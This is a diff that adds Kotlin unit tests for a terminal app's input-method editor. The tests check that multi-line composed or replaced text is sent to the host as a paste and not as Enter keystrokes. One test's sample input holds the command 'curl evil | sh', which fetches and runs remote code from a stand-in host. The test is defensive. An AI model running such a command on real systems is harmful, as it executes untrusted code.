@@ -377,6 +377,156 @@ class ImeEditorTest {
     }
 
     @Test
+    fun aLineFeedReplacingTextBeforeTheEndOfTheBufferIsAPasteOfTheRest() {
+        editor.commitText("echo hi")
+        sent.clear()
+        // "echo" must not run with "hi" typed on the next line.
+        assertTrue(editor.replaceText(4, 5, "\n"))
+        assertEquals(listOf<HostInput>(delete(3), HostInput.Paste("\nhi")), sent)
+        assertEquals("", editor.text)
+        assertEquals(1, restarts)
+    }
+
+    @Test
+    fun aLineFeedReplacingTheEndOfTheBufferIsEnter() {
+        editor.commitText("echo hi")
+        sent.clear()
+        assertTrue(editor.replaceText(4, 7, "\n"))
+        assertEquals(listOf<HostInput>(delete(3), enter), sent)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun aLineFeedReplacingTextAfterAPasteInTheSameBatchEditIsPastedToo() {
+        editor.beginBatchEdit()
+        editor.replaceText(0, 0, "line1\nline2")
+        editor.replaceText(0, 0, "\n")
+        assertFalse(editor.endBatchEdit())
+        assertEquals(
+            listOf<HostInput>(HostInput.Paste("line1\nline2"), HostInput.Paste("\n")),
+            sent,
+        )
+    }
+
+    @Test
+    fun aReplacementCommitsTheComposingTextOfSeveralLinesAsAPaste() {
+        editor.commitText("ab")
+        editor.setComposingText("x\ny")
+        sent.clear()
+        // The range ends before the composing text, whose lines the replacement commits.
+        assertTrue(editor.replaceText(1, 2, "c"))
+        assertEquals(listOf<HostInput>(delete(1), HostInput.Paste("cx\ny")), sent)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun aReplacementInTheComposingTextCommitsItsLinesBeforeTheRangeAsAPaste() {
+        editor.commitText("ab")
+        editor.setComposingText("x\nyz")
+        sent.clear()
+        assertTrue(editor.replaceText(5, 6, "Z"))
+        assertEquals(listOf<HostInput>(HostInput.Paste("x\nyZ")), sent)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun composingTextOfSeveralLinesIsPastedWhenFinished() {
+        editor.commitText("ab")
+        editor.setComposingText("echo safe\ncurl evil | sh\n")
+        assertEquals(listOf<HostInput>(text("ab")), sent)
+        editor.finishComposingText()
+        assertEquals(
+            listOf<HostInput>(text("ab"), HostInput.Paste("echo safe\ncurl evil | sh\n")),
+            sent,
+        )
+        assertEquals("", editor.text)
+        assertEquals(1, restarts)
+    }
+
+    @Test
+    fun composingTextOfSeveralLinesIsPastedWhenAnyCallCommitsIt() {
+        val commits =
+            listOf<Pair<String, (ImeEditor) -> Unit>>(
+                "setComposingRegion(0, 0)" to { it.setComposingRegion(0, 0) },
+                "onKeyDown(q)" to { it.onKeyDown(KeyStroke.Character('q'.code)) },
+                "onKeyDown(Left)" to { it.onKeyDown(KeyStroke.Special(TerminalKey.Left)) },
+                "closeConnection" to { it.closeConnection() },
+                "typeText" to { it.typeText("t") },
+                "paste" to { it.paste("p") },
+                "sendPendingInput" to { it.sendPendingInput() },
+            )
+        for ((name, call) in commits) {
+            val inputs = mutableListOf<HostInput>()
+            val editor =
+                ImeEditor(
+                    object : ImeEditor.Listener {
+                        override fun send(input: HostInput) {
+                            inputs += input
+                        }
+
+                        override fun restartInput() {}
+                    }
+                )
+            editor.setComposingText("a\nb")
+            call(editor)
+            assertEquals(HostInput.Paste("a\nb"), inputs.firstOrNull(), name)
+            assertTrue(inputs.drop(1).none { it == enter }, "$name: $inputs")
+        }
+    }
+
+    @Test
+    fun composingTextOfSeveralLinesIsPastedWhenTheHistoryLimitCommitsIt() {
+        val small =
+            ImeEditor(
+                object : ImeEditor.Listener {
+                    override fun send(input: HostInput) {
+                        sent += input
+                    }
+
+                    override fun restartInput() {}
+                },
+                maxHistoryLength = 3,
+            )
+        small.beginBatchEdit()
+        small.commitText("abc")
+        small.setComposingText("dx\ny")
+        // Commits "d", which takes the history over its limit.
+        small.setComposingRegion(4, 7)
+        assertEquals(listOf<HostInput>(text("abcd"), HostInput.Paste("x\ny")), sent)
+        assertEquals("", small.text)
+    }
+
+    @Test
+    fun aComposingRegionAfterALineBreakPastesTheComposingTextBeforeIt() {
+        editor.setComposingText("a\nbc")
+        assertTrue(editor.setComposingRegion(3, 4))
+        assertEquals(listOf<HostInput>(HostInput.Paste("a\nb")), sent)
+        assertEquals("c", editor.text)
+        assertEquals(0, editor.composingStart)
+    }
+
+    @Test
+    fun composingTextOfALineFeedAloneIsEnterWhenFinished() {
+        editor.commitText("ls")
+        editor.setComposingText("\n")
+        editor.finishComposingText()
+        assertEquals(listOf<HostInput>(text("ls"), enter), sent)
+    }
+
+    @Test
+    fun composingTextOfALineFeedAloneAfterAPasteInTheSameBatchEditIsPastedToo() {
+        editor.beginBatchEdit()
+        editor.commitText("echo one\necho two")
+        editor.setComposingText("\n")
+        editor.finishComposingText()
+        editor.endBatchEdit()
+        assertEquals(
+            listOf<HostInput>(HostInput.Paste("echo one\necho two"), HostInput.Paste("\n")),
+            sent,
+        )
+    }
+
+    @Test
     fun typedTextIsNotKeptInTheHistory() {
         editor.commitText("ls ")
         editor.typeText("hunter2")
